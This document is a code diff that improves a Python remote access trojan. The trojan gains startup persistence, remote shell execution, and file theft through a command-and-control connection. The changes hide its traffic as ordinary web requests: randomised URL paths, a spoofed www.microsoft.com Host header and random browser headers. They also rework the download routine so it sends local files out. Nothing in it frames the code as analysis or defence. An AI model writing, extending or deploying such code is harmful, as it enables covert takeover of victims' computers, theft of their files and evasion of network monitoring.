@@ -5,21 +5,44 @@ import time
 import shutil
 import sys
 import json
-import base64
 import threading
+import random
+import string
 
-def http_send(sock, data):
+def random_path():
+    return "/" + "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 16))) + ".html"
+
+def random_headers():
+    headers = [
+        "Accept-Encoding: gzip, deflate",
+        "Cache-Control: no-cache",
+        "Pragma: no-cache",
+        "Referer: https://www.google.com/",
+        "X-Requested-With: XMLHttpRequest",
+        "DNT: 1",
+        "Upgrade-Insecure-Requests: 1",
+        "Sec-Fetch-Mode: navigate",
+        "Sec-Fetch-Site: cross-site",
+        "Sec-Fetch-User: ?1",
+        "TE: trailers",
+    ]
+    return "\r\n".join(random.sample(headers, k=random.randint(2, 6)))
+
+def http_send(sock, data, pad=True):
     if isinstance(data, bytes):
-        body = base64.b64encode(data)
+        body = data
         length = len(body)
     else:
-        body = base64.b64encode(data.encode())
+        body = data.encode()
         length = len(body)
+    path = random_path()
+    extra_headers = random_headers()
     headers = (
-        "POST /index.html HTTP/1.1\r\n"
+        f"POST {path} HTTP/1.1\r\n"
         "Host: www.microsoft.com\r\n"
         "User-Agent: Mozilla/5.0\r\n"
         "Accept: */*\r\n"
+        f"{extra_headers}\r\n"
         "Connection: keep-alive\r\n"
         f"Content-Length: {length}\r\n\r\n"
     ).encode()
@@ -39,35 +62,30 @@ def http_recv(sock, as_bytes=False):
     while len(rest) < content_length:
         rest += sock.recv(4096)
     data = rest[:content_length]
-    # Fix: decode only if valid base64
-    try:
-        decoded = base64.b64decode(data, validate=True)
-        if as_bytes:
-            return decoded
-        else:
-            return decoded.decode(errors="ignore")
-    except Exception:
-        # fallback: decode as text
+    if as_bytes:
+        return data
+    else:
         return data.decode(errors="ignore")
 
 def upload(sock, filename):
+    if not os.path.isfile(filename):
+        http_send(sock, f"UPLOAD ERROR: Datei '{filename}' nicht gefunden")
+        return
     try:
         with open(filename, "rb") as f:
-            http_send(sock, f.read())
+            data = f.read()
+        http_send(sock, data)
     except Exception as e:
         http_send(sock, f"UPLOAD ERROR: {e}")
 
 def download(sock, filename):
+    if not os.path.isfile(filename):
+        http_send(sock, f"DOWNLOAD ERROR: Datei '{filename}' nicht gefunden")
+        return
     try:
-        data = http_recv(sock, as_bytes=True)
-        try:
-            text = data.decode(errors="ignore")
-            if text.startswith("UPLOAD ERROR") or text.startswith("DOWNLOAD ERROR"):
-                return
-        except Exception:
-            pass
-        with open(filename, "wb") as f:
-            f.write(data)
+        with open(filename, "rb") as f:
+            data = f.read()
+        http_send(sock, data)
     except Exception as e:
         http_send(sock, f"DOWNLOAD ERROR: {e}")
 
@@ -157,7 +175,7 @@ def background_execute(script, sock):
         http_send(sock, f"BGEXECUTE ERROR: {e}")
 
 pause_event = threading.Event()
-pause_event.set()  # Start unpaused
+pause_event.set()  
 
 def pause_for(seconds):
     pause_event.clear()
@@ -168,7 +186,6 @@ def run_rat(server_ip, server_port):
     copy_to_startup()
     while True:
         if not pause_event.is_set():
-            # Pause: Verbindung schließen, Port freigeben
             time.sleep(1)
             continue
         try:
@@ -193,9 +210,9 @@ def run_rat(server_ip, server_port):
                     try:
                         seconds = int(data[len("clientpause "):].strip())
                         http_send(s, f"Client paused for {seconds} seconds")
-                        s.close()  # Verbindung schließen, Port freigeben
+                        s.close()  
                         pause_for(seconds)
-                        break  # Schleife verlassen, nach Pause neu verbinden
+                        break  
                     except Exception as e:
                         http_send(s, f"CLIENTPAUSE ERROR: {e}")
                 elif data.lower() == "resume":
@@ -252,9 +269,10 @@ def run_rat(server_ip, server_port):
                     shellcmd = data[len("command "):].strip()
                     try:
                         output = subprocess.check_output(shellcmd, shell=True, stderr=subprocess.STDOUT)
-                        http_send(s, output.decode(errors="ignore"))
+                        # Sende Shell-Ausgabe ohne Padding!
+                        http_send(s, output.decode(errors="ignore"), pad=False)
                     except Exception as e:
-                        http_send(s, f"COMMAND ERROR: {e}")
+                        http_send(s, str(e), pad=False)
                 elif data.startswith("cat "):
                     filename = data[len("cat "):].strip()
                     try:
